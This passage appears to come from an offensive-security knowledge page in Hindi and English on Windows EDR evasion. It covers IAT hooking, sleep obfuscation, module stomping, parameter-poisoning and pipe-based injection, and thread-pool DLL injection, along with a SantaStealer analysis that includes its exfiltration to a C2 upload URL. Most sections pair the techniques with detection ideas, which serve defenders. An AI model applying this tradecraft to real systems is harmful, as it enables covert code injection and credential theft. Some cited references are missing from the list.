- Target APIs register करने के लिए Aggressor script का उपयोग करें, ताकि Beacon और BOFs बिना code changes के उसी evasion path का पारदर्शी रूप से लाभ उठा सकें।

Detection/DFIR considerations
- IAT integrity: ऐसी entries जो non-image (heap/anon) addresses पर resolve होती हैं; import pointers का समय-समय पर verification।
- Stack anomalies: ऐसे return addresses जो loaded images से संबंधित नहीं हैं; non-image PIC पर अचानक transitions; असंगत RtlUserThreadStart ancestry।
- Loader telemetry: process के भीतर IAT में writes, import thunks को बदलने वाली शुरुआती DllMain activity, load के समय बनाए गए अप्रत्याशित RX regions।
- Image-load evasion: यदि LoadLibrary* को hook किया गया है, तो memory masking events से संबंधित automation/clr assemblies के संदिग्ध loads की निगरानी करें।

Related building blocks and examples
- ऐसे Reflective loaders जो load के दौरान IAT patching करते हैं (उदा., TitanLdr, AceLdr)
- Memory masking hooks (उदा., simplehook) और stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (उदा., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Resident PICO के ज़रिए import-time IAT hooks

यदि आपका reflective loader पर नियंत्रण है, तो `ProcessImports()` **के दौरान** loader के `GetProcAddress` pointer को ऐसे custom resolver से बदलकर imports को hook किया जा सकता है, जो पहले hooks जाँचता है:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- एक **resident PICO** (persistent PIC object) बनाएँ, जो transient loader PIC के खुद को free करने के बाद भी बना रहे।
- एक `setup_hooks()` function export करें, जो loader के import resolver को overwrite करे (उदा., `funcs.GetProcAddress = _GetProcAddress`)।
- `_GetProcAddress` में ordinal imports को छोड़ें और `__resolve_hook(ror13hash(name))` जैसी hash-based hook lookup का उपयोग करें। यदि hook मौजूद हो, तो उसे return करें; अन्यथा असली `GetProcAddress` को call करें।
- Crystal Palace में `addhook "MODULE$Func" "hook"` entries के ज़रिए link time पर hook targets register करें। Hook मान्य रहता है क्योंकि वह resident PICO के भीतर मौजूद होता है।

इससे load के बाद loaded DLL के code section को patch किए बिना **import-time IAT redirection** होता है।

### जब target PEB-walking का उपयोग करता हो, तब hookable imports बाध्य करना

Import-time hooks तभी trigger होते हैं, जब function वास्तव में target की IAT में हो। यदि कोई module PEB-walk + hash के ज़रिए APIs resolve करता है (और कोई import entry नहीं होती), तो एक वास्तविक import जोड़ें, ताकि loader का `ProcessImports()` path उसे देख सके:

- Hashed export resolution (उदा., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) को `&WaitForSingleObject` जैसे direct reference से बदलें।
- Compiler एक IAT entry emit करता है, जिससे reflective loader द्वारा imports resolve किए जाने पर interception संभव होता है।

### `Sleep()` को patch किए बिना Ekko-शैली की sleep/idle obfuscation

`Sleep` को patch करने के बजाय implant द्वारा उपयोग किए जाने वाले **वास्तविक wait/IPC primitives** (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`) को hook करें। लंबे waits के लिए, idle के दौरान in-memory image को encrypt करने वाली Ekko-शैली की obfuscation chain में call को wrap करें:<sup>[[31]](#references)[[27]](#references)</sup>

- `CreateTimerQueueTimer` का उपयोग करके callbacks का एक sequence schedule करें, जो crafted `CONTEXT` frames के साथ `NtContinue` call करें।
- सामान्य chain (x64): image को `PAGE_READWRITE` पर set करें → पूरी mapped image पर `advapi32!SystemFunction032` के ज़रिए RC4 encrypt करें → blocking wait करें → RC4 decrypt करें → PE sections पर चलकर **प्रति-section permissions restore करें** → completion signal करें।
- `RtlCaptureContext` एक template `CONTEXT` देता है; उसे कई frames में clone करें और हर step invoke करने के लिए registers (`Rip/Rcx/Rdx/R8/R9`) set करें।

Operational detail: लंबे waits (उदा., `WAIT_OBJECT_0`) के लिए “success” return करें, ताकि image masked रहने के दौरान caller आगे बढ़े। यह pattern idle windows के दौरान module को scanners से छिपाता है और आम “patched `Sleep()`” signature से बचता है।

Detection ideas (telemetry-based)
- `NtContinue` की ओर संकेत करने वाले `CreateTimerQueueTimer` callbacks के bursts।
- बड़े, contiguous image-sized buffers पर `advapi32!SystemFunction032` का उपयोग।
- बड़े range पर `VirtualProtect` के बाद custom per-section permission restoration।

### Sleep-obfuscation gadgets के लिए runtime CFG registration

CFG-enabled targets पर, `jmp [rbx]` या `jmp rdi` जैसे mid-function gadget में पहला indirect jump आम तौर पर process को `STATUS_STACK_BUFFER_OVERRUN` के साथ crash कर देगा, क्योंकि gadget module के CFG metadata में मौजूद नहीं होता। Hardened processes के भीतर Ekko/Kraken-शैली की chains को चलाए रखने के लिए:<sup>[[30]](#references)</sup>

- Chain द्वारा उपयोग किए जाने वाले हर indirect destination को `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` और `CFG_CALL_TARGET_VALID` entries के साथ register करें।
- Loaded images (`ntdll`, `kernel32`, `advapi32`) के भीतर के addresses के लिए `MEMORY_RANGE_ENTRY` image base से शुरू होना चाहिए और पूरी image size को cover करना चाहिए।
- Manually mapped/PIC/stomped regions के लिए इसके बजाय allocation base और allocation size का उपयोग करें।
- केवल dispatch gadget को ही नहीं, बल्कि indirectly पहुँचने वाले exports (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) और उन attacker-controlled executable sections को भी mark करें जो indirect targets बनेंगे।

इससे ROP/JOP-शैली की sleep chains “केवल non-CFG processes में काम करती हैं” से बदलकर `explorer.exe`, browsers, `svchost.exe` और `/guard:cf` के साथ compiled अन्य endpoints के लिए reusable primitive बन जाती हैं।

### सोते हुए threads के लिए CET-safe stack spoofing

Full `CONTEXT` replacement noisy होता है और CET Shadow Stack systems पर fail हो सकता है, क्योंकि spoofed `Rip` का hardware shadow stack से मेल खाना ज़रूरी है। Sleep-masking का अधिक सुरक्षित pattern यह है:<sup>[[30]](#references)</sup>

- उसी process में एक दूसरा thread चुनें और `NtQueryInformationThread` के ज़रिए उसकी `NT_TIB` / TEB stack bounds (`StackBase`, `StackLimit`) पढ़ें।
- Current thread के असली TEB/TIB का backup लें।
- `GetThreadContext` के साथ सो रहे thread का असली context capture करें।
- Spoof context में **केवल** असली `Rip` copy करें और spoofed `Rsp`/stack state को जस का तस रहने दें।
- Sleep window के दौरान, spoof thread की `NT_TIB` को current TEB में copy करें, ताकि stack walkers एक legitimate stack range के भीतर unwind करें।
- Wait पूरा होने के बाद, मूल TIB और thread context restore करें।

इससे CET-संगत instruction pointer बना रहता है और उन EDR stack walkers को गुमराह किया जाता है जो unwinds की जाँच के लिए TEB stack metadata पर भरोसा करते हैं।

### APC-आधारित विकल्प: Kraken Mask

यदि timer-queue dispatch की signature बहुत स्पष्ट हो, तो वही sleep-encrypt-spoof-restore sequence queued APCs के ज़रिए suspended helper thread से चलाया जा सकता है:<sup>[[27]](#references)</sup>

- Entry point के रूप में `NtTestAlert` वाला helper thread बनाएँ।
- `NtQueueApcThread` के साथ तैयार `CONTEXT` frames/APCs queue करें और `NtAlertResumeThread` के साथ उन्हें drain करें।
- Default 64 KB thread stack समाप्त होने से बचने के लिए chain state को helper stack के बजाय heap पर रखें।
- Start event को atomically signal करने और block करने के लिए `NtSignalAndWaitForSingleObject` का उपयोग करें।
- TIB/context restore करने से पहले main thread को suspend करें (`NtSuspendThread` → restore → `NtResumeThread`), ताकि scanner द्वारा आधे-restored stack को पकड़ने की race window कम हो।

इससे समान RC4 masking और stack-spoofing लक्ष्य रखते हुए `CreateTimerQueueTimer` + `NtContinue` signature की जगह helper-thread/APC signature इस्तेमाल होती है।

Additional detection ideas
- Sleeps, waits या APC dispatch से कुछ समय पहले `VmCfgCallTargetInformation` के साथ `NtSetInformationVirtualMemory` का उपयोग।
- `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` या `ConnectNamedPipe` के आसपास wrapped `GetThreadContext`/`SetThreadContext`।
- `NtQueryInformationThread` के बाद current thread के TEB/TIB stack bounds में direct writes।
- `NtQueueApcThread`/`NtAlertResumeThread` chains जो अप्रत्यक्ष रूप से `SystemFunction032`, `VirtualProtect` या section-permission restoration helpers तक पहुँचती हैं।
- Signed modules के भीतर dispatch pivots के रूप में `FF 23` (`jmp [rbx]`) या `FF E7` (`jmp rdi`) जैसी छोटी gadget signatures का बार-बार उपयोग।


## Precision Module Stomping

Module stomping में obvious private executable memory allocate करने या नई sacrificial DLL load करने के बजाय, payloads को **target process के भीतर पहले से mapped DLL के `.text` section से execute किया जाता है**। Overwrite target एक **loaded, disk-backed image** होना चाहिए, जिसका code space process को अब भी ज़रूरी code paths corrupt किए बिना payload को समा सके।<sup>[[1]](#references)[[2]](#references)</sup>

### Reliable target selection

`uxtheme.dll` या `comctl32.dll` जैसे आम modules पर naive stomping भरोसेमंद नहीं है: हो सकता है DLL remote process में loaded न हो, और code region बहुत छोटा होने पर process crash हो जाएगा। अधिक भरोसेमंद workflow यह है:

1. Target process के modules enumerate करें और पहले से loaded DLLs की **केवल नामों वाली include list** रखें।
2. पहले payload बनाएँ और उसका **सटीक byte size** दर्ज करें।
3. Disk पर candidate DLLs scan करें और PE section के **`.text` `Misc_VirtualSize`** की payload size से तुलना करें। यह file size से अधिक मायने रखता है, क्योंकि यह executable section का **memory में map होने पर** आकार दर्शाता है।
4. **Export Address Table (EAT)** parse करें और stomp start offset के रूप में किसी exported function का RVA चुनें।
5. **Blast radius** की गणना करें: यदि payload चुने गए function boundary से बड़ा है, तो यह memory में उसके बाद रखे adjacent exports को overwrite कर देगा।

आम तौर पर उपयोग किए जाने वाले recon/selection helpers:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operational notes
- Remote process में **already loaded** DLLs को प्राथमिकता दें, ताकि `LoadLibrary`/unexpected image loads की telemetry से बचा जा सके।
- ऐसे exports को प्राथमिकता दें जिन्हें target application शायद ही कभी execute करती हो; अन्यथा सामान्य code paths, thread creation से पहले या बाद में stomped bytes तक पहुँच सकते हैं।
- बड़े implants के लिए अक्सर injector source में shellcode embedding को string literal से **byte-array/braced initializer** में बदलना पड़ता है, ताकि पूरा buffer सही ढंग से represent हो।

Detection ideas
- अधिक सामान्य private RWX/RX allocations के बजाय **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) में remote writes।
- ऐसे export entry points जिनके in-memory bytes अब disk पर मौजूद backing file से मेल नहीं खाते।
- ऐसे remote threads या context pivots जो किसी legitimate DLL export के भीतर execution शुरू करते हैं, जिसके शुरुआती bytes हाल ही में modified हुए हों।
- DLL `.text` pages पर संदिग्ध `VirtualProtect(Ex)` / `WriteProcessMemory` sequences, जिनके बाद thread creation हो।

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) एक **process-injection / EDR-evasion** technique है, जो classic remote write path (`VirtualAllocEx` + `WriteProcessMemory`) से बचती है। पहले से चल रहे target में bytes copy करने के बजाय, यह इस तथ्य का दुरुपयोग करती है कि Windows चुने हुए `CreateProcessW` startup parameters को child process में **copy** करता है और उन्हें `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) में संग्रहीत करता है।<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers copied by `CreateProcessW`

उपयोगी carriers हैं:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (`CREATE_UNICODE_ENVIRONMENT` के साथ) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

व्यावहारिक carrier सीमाएँ:

- `lpCommandLine` को `CreateProcessW` के लिए **writable memory** की ओर point करना चाहिए, और इसकी सीमा null terminator सहित **32,767 Unicode characters** है।
- `lpEnvironment` successive `NAME=VALUE\0` strings वाला Unicode environment block होना चाहिए, जिसके अंत में एक अतिरिक्त `\0` हो।
- `lpReserved` आधिकारिक रूप से reserved है, इसलिए `ShellInfo` mapping को स्थिर, documented contract के बजाय implementation detail मानना चाहिए।

इससे सामान्य process creation **payload-transfer primitive** बन जाता है। Operator attacker-controlled startup data के साथ child process बनाता है और Windows को cross-process copy करने देता है।

### Remote write APIs के बिना Remote lookup flow

Child बन जाने के बाद, **read-only** primitives से copied buffer का पता लगाएँ:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` प्राप्त करें
2. Remote `PEB` पढ़ें
3. `PEB.ProcessParameters` तक जाएँ
4. `RTL_USER_PROCESS_PARAMETERS` पढ़ें
5. चुने गए pointer का उपयोग करें:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

न्यूनतम flow:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### कॉपी किए गए पैरामीटर बफ़र को execute करना

कॉपी किया गया पैरामीटर क्षेत्र आमतौर पर `RW` होता है, executable नहीं। एक सामान्य P3 chain यह है:

1. प्रोसेस को सामान्य रूप से बनाएँ (suspended नहीं)
2. चुने गए पैरामीटर पेज को `NtProtectVirtualMemory` / `VirtualProtectEx` से executable बनाएँ
3. `PROCESS_INFORMATION` में पहले से लौटाए गए main thread handle का फिर से उपयोग करें
4. `NtSetContextThread` (`CONTEXT_CONTROL`, `RIP` overwrite करें) से execution को redirect करें

क्लासिक thread hijacking workflows के विपरीत, इसके लिए `SuspendThread` / `ResumeThread` की **आवश्यकता नहीं होती**; लौटाए गए main thread handle पर सीधे context बदला जा सकता है।

इससे injection के लिए आमतौर पर मॉनिटर की जाने वाली कई APIs से बचा जा सकता है:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- अक्सर `SuspendThread` / `ResumeThread` से भी

### Null-byte सीमा और staged shellcode

तीनों carriers **string या string-जैसे data** हैं, इसलिए `0x00` वाला raw payload transfer के दौरान truncate हो जाता है। इसका एक व्यावहारिक workaround है **null-free first stage**, जो runtime पर constants को फिर से बनाता है और फिर मनमाना second stage load करता है।

एक सरल pattern XOR-आधारित constant synthesis है:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

यह first stage को transported parameter में null bytes embed किए बिना stack strings, API arguments, DLL paths या second-stage shellcode loader बनाने देता है।

### First stage से stack-based API calls

जब first stage को `LoadLibraryA` जैसे APIs call करने हों, तो यह:

- target stack पर string/buffer push कर सकता है
- **32-byte x64 shadow space** reserve कर सकता है
- `RCX`, `RDX`, `R8`, `R9` को constants या `RSP`-relative pointers पर set कर सकता है
- call से पहले `RSP` को **16-byte aligned** रख सकता है

इसके बाद second stage को stack से `PAGE_READWRITE` allocation में copy किया जा सकता है, `VirtualProtect` से उसकी protection `PAGE_EXECUTE_READ` में बदली जा सकती है और फिर उस पर jump किया जा सकता है। इससे सीधे RWX allocation की ज़रूरत नहीं पड़ती।

### Detection के विचार

लेखकों द्वारा बताए गए अच्छे hunting अवसर:

- `VirtualProtectEx` / `NtProtectVirtualMemory` द्वारा **process-parameter pages को executable बनाना**
- उस protection change के बाद `SetThreadContext` / `NtSetContextThread का इस्तेमाल
- पहले `PEB` और फिर `RTL_USER_PROCESS_PARAMETERS` को remote रूप से पढ़ना
- process creation के दौरान असामान्य रूप से लंबे / high-entropy `lpCommandLine`, `lpEnvironment` या `STARTUPINFO.lpReserved` values

### Notes

- P3 एक **cross-process transfer trick** है, अपने आप में पूर्ण execution primitive नहीं: copy किए गए parameter को अब भी execute-permission change और execution redirection method की ज़रूरत होती है।
- लेखकों ने `RtlCreateProcessReflection` / Dirty Vanity पर विचार किया, लेकिन इसे अस्वीकार कर दिया क्योंकि यह internally `NtWriteVirtualMemory` और `NtCreateThreadEx` जैसे suspicious primitives तक पहुँचता है।

## Console STDIN pipe injection

एक interactive console child को **payload-transfer primitive** के रूप में भी इस्तेमाल किया जा सकता है। Injector child के standard input को एक pipe पर redirect करता है और marker के बाद shellcode भेजता है। Console program द्वारा data को अपनी private memory में पढ़ लेने के बाद, injector उस buffer को ढूँढता है, उसे executable बनाता है और child thread को उस पर redirect करता है। इससे `VirtualAllocEx` और `WriteProcessMemory` की ज़रूरत नहीं पड़ती, लेकिन यह अब भी process injection है, कोई general EDR bypass नहीं।<sup>[[41]](#references)</sup>

"named-pipe" विवरण के बावजूद, reference implementation `CreatePipe` call करता है, जो एक **anonymous pipe** बनाता है। Windows internally anonymous pipes को uniquely named pipe objects से implement करता है, लेकिन PoC न तो `\\.\pipe\<name>` path चुनता है, न ही `CreateNamedPipe` call करता है। यह default security descriptor के साथ inheritable handles बनाता है, read handle को `STARTUPINFO.hStdInput` में रखता है, `STARTF_USESTDHANDLES` set करता है और handle inheritance enabled रखकर एक नया child launch करता है। इसलिए, यह PoC दी गई console executable को launch करता है; यह अपने pipe को किसी existing process से attach नहीं करता।<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Reference workflow

Implementation इस chain का उपयोग करता है:<sup>[[41]](#references)</sup>

1. Child के `STDIN` और `STDOUT` के लिए anonymous pipe pairs बनाएँ। Parent-side के दो handles पर inheritance clear करें और process creation के बाद parent में child-side duplicates बंद करें।
2. `netsh.exe` या `nslookup.exe` जैसी interactive executable को `CREATE_NEW_CONSOLE` के साथ launch करें। Child redirected standard handles inherit करता है।
3. Parent-side `STDIN` handle से `WriteFile` द्वारा पूरा binary `rawData` array भेजें। Console program bytes को consume करता है और अपनी किसी private committed region में उनकी copy छोड़ देता है।
4. `VirtualQueryEx` से child का address space traverse करें, `ReadProcessMemory` से candidate `MEM_PRIVATE` regions पढ़ें और `rawData` की शुरुआत में marker खोजें।
5. `VirtualProtectEx` से मिले हुए buffer को `PAGE_EXECUTE_READWRITE` में बदलें।
6. Main thread पहचानें, उसे suspend करें, `NtSetContextThread` से `RIP` को `found_address + 0x19` पर set करें और फिर उसे resume करें।

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

दिया गया implementation x64-specific है: यह `CONTEXT.Rip` को संशोधित करता है, और इसमें embedded payload x64 shellcode है। `rawData` की शुरुआत 25-byte marker से होती है, इसलिए executable bytes hexadecimal offset `0x19` से शुरू होते हैं। Payload बदलते समय इस layout को बनाए रखें, या marker, search vector, array size और execution offset—इन सभी को साथ में अपडेट करें। Source comments में `0x0A`, `0x0D` और `0x1A` को bad characters भी बताया गया है। यह workflow child के token या privileges में बदलाव नहीं करता।<sup>[[41]](#references)</sup>

छोटे native helpers और payload compilation patterns के लिए, [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md) देखें।

## Shellcode के बिना Thread-pool callback DLL injection (DLLParty)

DLLParty, PoolParty-style thread-pool injection को इस तरह अपनाता है कि मौजूदा target worker injected callback stub execute करने के बजाय `LoadLibraryA` call करे। इसका dispatch primitive target pool के I/O completion port पर queued `TP_DIRECT` completion है। इससे process permissions bypass नहीं होतीं: PoC `OpenProcess(PROCESS_ALL_ACCESS)` call करता है और इसके लिए target memory को पढ़ने/लिखने की अनुमति तथा worker-factory और completion-port handles को duplicate करने की क्षमता चाहिए।<sup>[[46]](#references)[[47]](#references)</sup>

Windows x64 पर, worker stack-backed `TP_CALLBACK_INSTANCE` का pointer `RCX` में देता है, जो पहला callback argument है। `LoadLibraryA` उसी pointer को `LPCSTR` के रूप में समझता है। Tested path पर, `TppWorkerThread` pointer को `RSP+0x178` पर बनाता है, जबकि उस object में उसका पहला सामान्य write `RSP+0x1d0` पर होता है। इसलिए, इस 0x58-byte prefix में फिट होने वाला null-terminated DLL path dispatch से पहले instance की शुरुआत में रखा जा सकता है, बिना उसके overwrite हुए। यह किसी विशिष्ट build पर किया गया अवलोकन है, Windows ABI की documented guarantee नहीं।<sup>[[46]](#references)[[47]](#references)</sup>

Reference workflow यह है:<sup>[[46]](#references)[[47]](#references)</sup>

1. `NtQuerySystemInformation(SystemHandleInformation)` से target के handles enumerate करें और object types query करके `TpWorkerFactory` की पहचान करें। Worker-factory handle duplicate करें और `WorkerFactoryBasicInformation` query करें; `StartParameter` remote `TP_POOL` देता है। `TotalWorkerCount == 0` वाले factories को छोड़ दें।
2. `TP_POOL.CompletionPort` पढ़ें और pool की private worker list को traverse करें। Tested Windows 10 19045 x64 build (`ntdll.dll 10.0.19041.4842`) पर, इसका head `pool+0x60` पर है; हर link `worker+0x10` पर है, इसलिए `worker+0x38` पर callback-instance slot, `link+0x28` के बराबर है। PoC pointer alignment, link reciprocity, pool ownership, nonzero thread IDs, repeated nodes और stable list head की जाँच करता है।
3. DLL path को मिले हुए **हर** worker slot में लिखें, क्योंकि queued completion को कोई भी worker consume कर सकता है। Writable target memory में `Callback = LoadLibraryA` वाला `TP_DIRECT` रखें। PoC `VirtualAllocEx` के बजाय worker stack पर `last_slot-0x500` का उपयोग करता है; यह offset experimental है और active stack data से टकराना नहीं चाहिए।
4. Target completion-port handle duplicate करें और `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)` call करें। Remote `TP_DIRECT` address completion key है। इसके बाद मौजूदा worker अपने overwritten callback-instance pointer के साथ `LoadLibraryA` call करता है और target के लिए पहले से accessible DLL load करता है।

PoC target PID (`DLLParty.exe <target_pid>`) लेता है और `DLLParty.cpp` में hard-coded DLL path का उपयोग करता है; x64 executable बनाने से पहले ऐसा path सेट करें जो target के लिए accessible हो। यह remote callback के रूप में अपने process के `LoadLibraryA` address का भी उपयोग करता है, इसलिए मानता है कि वह address target में valid है। Code, path length को 0x58-byte prefix से मिलाकर नहीं जाँचता और न ही यह जाँचता है कि worker traversal से कोई slot मिला था या नहीं, इससे पहले कि वह last element को index करे। Target build के लिए private offsets, stack layout और writable space को फिर से validate करें। `CreateRemoteThreadEx`, shellcode और `VirtualAllocEx` को छोड़ने से cross-process writes या DLL-load telemetry समाप्त नहीं होती।<sup>[[46]](#references)[[47]](#references)</sup>

## Fileless Evasion और Credential Theft के लिए SantaStealer Tradecraft

SantaStealer (उर्फ BluelineStealer) दिखाता है कि आधुनिक info-stealers, AV bypass, anti-analysis और credential access को एक ही workflow में कैसे जोड़ते हैं।<sup>[[24]](#references)</sup>

### Keyboard layout gating और sandbox delay

- एक config flag (`anti_cis`), `GetKeyboardLayoutList` के ज़रिए installed keyboard layouts enumerate करता है। अगर Cyrillic layout मिलता है, तो sample एक खाली `CIS` marker छोड़ता है और stealers चलाने से पहले terminate हो जाता है। इससे वह excluded locales पर detonate नहीं होता, जबकि hunting artifact बना रहता है।

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Layered `check_antivm` logic

- Variant A process list को traverse करता है, हर नाम का custom rolling checksum बनाता है और उसे debuggers/sandboxes की embedded blocklists से मिलाता है; फिर computer name पर checksum दोबारा चलाता है और `C:\analysis` जैसी working directories की जाँच करता है।
- Variant B system properties (process-count floor, हाल का uptime) की जाँच करता है, VirtualBox additions का पता लगाने के लिए `OpenServiceA("VBoxGuest")` कॉल करता है और single-stepping पहचानने के लिए sleep के आसपास timing checks करता है। किसी भी संकेत पर modules launch होने से पहले प्रक्रिया abort हो जाती है।

### Fileless helper + double ChaCha20 reflective loading

- Primary DLL/EXE में Chromium credential helper embedded होता है, जिसे या तो disk पर drop किया जाता है या memory में manually map किया जाता है; fileless mode में imports/relocations को खुद resolve किया जाता है, इसलिए helper के कोई artifacts नहीं लिखे जाते।
- वह helper दूसरी-stage DLL को ChaCha20 से दो बार encrypted रखता है (दो 32-byte keys + 12-byte nonces)। दोनों passes के बाद, वह blob को reflectively load करता है (`LoadLibrary` के बिना) और [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) से लिए गए exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` कॉल करता है।<sup>[[25]](#references)</sup>
- ChromElevator routines direct-syscall reflective process hollowing का उपयोग करके live Chromium browser में inject करते हैं, AppBound Encryption keys inherit करते हैं और ABE hardening के बावजूद SQLite databases से सीधे passwords/cookies/credit cards decrypt करते हैं।

### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` global `memory_generators` function-pointer table पर iterate करता है और हर enabled module (Telegram, Discord, Steam, screenshots, documents, browser extensions आदि) के लिए एक thread शुरू करता है। हर thread shared buffers में results लिखता है और लगभग 45s की join window के बाद अपनी file count की रिपोर्ट करता है।
- काम पूरा होने पर, statically linked `miniz` library का उपयोग करके सब कुछ `%TEMP%\\Log.zip` के रूप में zip किया जाता है। फिर `ThreadPayload1` 15s सोता है और archive को HTTP POST के ज़रिए `http://<C2>:6767/upload` पर 10 MB chunks में stream करता है; इस दौरान browser का `multipart/form-data` boundary (`----WebKitFormBoundary***`) spoof किया जाता है। हर chunk में `User-Agent: upload`, `auth: <build_id>`, वैकल्पिक `w: <campaign_tag>` जोड़ा जाता है, और आखिरी chunk में `complete: true` जोड़ा जाता है, ताकि C2 को पता चले कि reassembly पूरी हो गई है।

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
